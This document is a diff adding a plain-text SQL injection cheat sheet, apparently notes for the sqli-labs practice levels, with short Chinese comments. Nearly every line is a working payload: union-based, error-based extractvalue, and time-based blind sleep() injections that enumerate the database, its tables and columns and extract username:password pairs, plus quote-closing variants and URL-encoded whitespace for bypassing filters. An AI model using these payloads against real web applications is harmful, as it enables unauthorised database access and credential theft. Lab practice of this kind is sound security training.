@@ -1,0 +1,79 @@
+1.
+      正常的手工注入
+	'union select 1,2,database() --+
+	'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+	'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
+	'union select 1,2,group_concat(username,0x3a,passwd) from users --+
+      报错性注入                                       '/'                ':'
+	  ' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+	                  前面的无所谓,后面的需要有concat拼接'/'然后进行xml的查询   写入的为其他格式就会返回我们写入的非法内容，这个非法的内容就是我们查询的内容
+	  ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users")))--+
+	  ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" and column_name not in("user","password"))))--+ 会显示不全所以要排除已经看到的内容
+	  ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,passwd) from users)))
+2.
+	union select 1,2,database() --+
+	union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+	union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
+	union select 1,2,group_concat(username,0x3a,passwd) from users --+
+3.
+	 ' )and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+	                  前面的无所谓,后面的需要有concat拼接'/'然后进行xml的查询   写入的为其他格式就会返回我们写入的非法内容，这个非法的内容就是我们查询的内容
+	  ' )and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users")))--+
+	  ' )and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" and column_name not in("user","password"))))--+ 会显示不全所以要排除已经看到的内容
+	  ' )and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,passwd) from users)))
+4.
+	") and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+	                  前面的无所谓,后面的需要有concat拼接'/'然后进行xml的查询   写入的为其他格式就会返回我们写入的非法内容，这个非法的内容就是我们查询的内容
+	 ") and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users")))--+
+	 ") and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" and column_name not in("user","password"))))--+ 会显示不全所以要排除已经看到的内容
+	 ") and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,passwd) from users)))--+
+5.
+	' and if(length(database())=8,sleep(5),1)--+
+	' and if(left(database(),1)='s',sleep(5),1)--+
+	' and if(left(database(),2)='se',sleep(5),1)--+
+	' and if(left(database(),3)='sec',sleep(5),1)--+
+	' and if(left(database(),4)='secu',sleep(5),1)--+
+			.
+			.
+			.
+	' and if(left(database(),8)='security',sleep(5),1)--+
+	
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u',sleep(5),1)-- #
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)='us',sleep(5),1)-- #
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),3)='use',sleep(5),1)-- #
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),4)='user',sleep(5),1)-- #
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1)-- #
+
+	' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password',sleep(5),1) -- #
+
+	' and if(left((select username from users order by id limit 0,1),4)='dumb',sleep(5),1)-- #
+	' and if(left((select password from users order by id limit 0,1),4)='dumb',sleep(5),1)-- #
+6.	
+	" and if(length(database())=8,sleep(5),1) -- #
+	" and if(left(database(),1)='s',sleep(5),1) -- #
+	" and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u',sleep(5),1) -- #
+	" and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password',sleep(5),1)-- #
+	" and if(left((select username from users order by id limit 0,1),4)='dumb',sleep(5),1)-- #
+7.
+	' and sleep(5) or 'a'='a
+	' and if(length(database())=8,sleep(5),1) or 'a'='a
+	' and if(left(database(),8)='security',sleep(5),1) or 'a'='a
+	' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u',sleep(5),1) or 'a'='a
+	' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password',sleep(5),1) or 'a'='a
+	' and if(left((select username from users order by id limit 0,1),4)='dumb',sleep(5),1) or 'a'='a
+23
+	' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
+	' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
+	' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '
+26.
+	%09 TAB键（水平）
+
+	%0a 新建一行
+
+	%0c 新的一页
+
+	%0d return功能
+
+	%0b TAB键（垂直）
+
+	%a0 空格
